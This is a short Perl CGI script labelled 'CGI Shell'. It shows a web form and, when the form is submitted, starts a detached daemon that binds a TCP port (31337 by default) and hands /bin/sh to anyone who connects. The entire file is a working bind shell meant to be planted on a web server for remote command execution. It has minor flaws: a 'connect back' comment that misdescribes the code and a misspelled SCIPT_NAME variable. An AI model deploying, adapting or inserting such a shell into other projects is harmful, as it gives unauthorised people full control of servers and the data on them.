#!/usr/bin/perl

#
# (C) Copyright Claes M Nyberg <md0claes@mdstud.chalmers.se> 2004
# $Id: cgi_post_bindsh.pl,v 1.2 2005-03-10 16:39:25 cmn Exp $
#

use Socket;

my $gotsigchld;

sub sigchld
{
	wait();
	$SIG{CHLD} = \&sigchld;
	$gotsigchld = 1;
}
			

# Detach and connect back
# $_[0] - IP
# $_[1] - Port
# $_[2] - Program (/bin/sh)
sub bindsh($$$)
{
	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'))  or
   		return("socket(): $!");

	setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) or
    	return("setsockopt(): $!");

	bind(SOCK, sockaddr_in($_[1], inet_aton($_[0]))) or
    	return("bind(): $!");

	listen(SOCK, SOMAXCONN);

	# Detach daemon
	(fork() != 0) and return('');

	for (;;) {
    	accept(CLIENT, SOCK);

    	if ($gotsigchld eq 1) {
        	$gotsigchld = 0;
        	next;
    	}

    	if (fork() == 0) {
        	open(STDIN, '>&CLIENT');
        	open(STDOUT, '>&CLIENT');
        	open(STDERR, '>&CLIENT');
        	exec($_[2]);
        	exit(1);
    	}
    	close(CLIENT);
	}

	exit(1);
}

# get arguments into an associative array
sub get_post_args()
{
    while (<STDIN>) {
        # cho(m)p away newline
        s/\n//;
        s/\r//;
        @arr = split(/=/, $_);
        $args{$arr[0]} = $arr[1];
    }
    return(%args);
}

# Reopen standard error as standard out
open(STDERR, ">&STDOUT");
%args = get_post_args();

print<<__ENDHTML__;
Content-type: text/html\n\n
    <head><title>CGI Shell</title></head>
    <html>
    <body>
__ENDHTML__

# Bind shell
if ( ($args{'ip'} ne "") and ($args{'port'} ne "") and ($args{'prog'} ne "")) {
    $err = bindsh($args{'ip'}, $args{'port'}, $args{'prog'});
	
	if ($err eq '') 
		{ print "[<b>$args{'prog'}</b>] listening on <b>$args{'ip'}:$args{'port'}</b>\n"; }
	else { print "Daemon failed: <b>$err</b>\n"; }
	
	print "<br><p><a href=\"$ENV{'SCIPT_NAME'}\">Back</a>\n";
	print "</body></html>";
	exit(0);
}
	

print "<form method=\"POST\" enctype=\"text/plain\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;

		<table border="0">
		<tr>
			<td>
        	<b>IPv4</b><br> 
			<input name="ip" type="text" size="20" value="0.0.0.0">
			</td>

			<td>
			<b>Port</b><br>
        	<input name="port" type="text" size="5" maxsize="5" value="31337">
			</td>
		</tr>
		<tr>
			<td colspan=2">
			<b>Program</b><br>
        	<input name="prog" type="text" size="20" value="/bin/sh">
			</td>
		</tr>
		<tr>
			<td colspan="2">
			<br> <input type="submit" value="Start Daemon">
			</td>
		</tr>
		
		</table>
		
    </form>
__ENDHTML__

print "</body></html>";
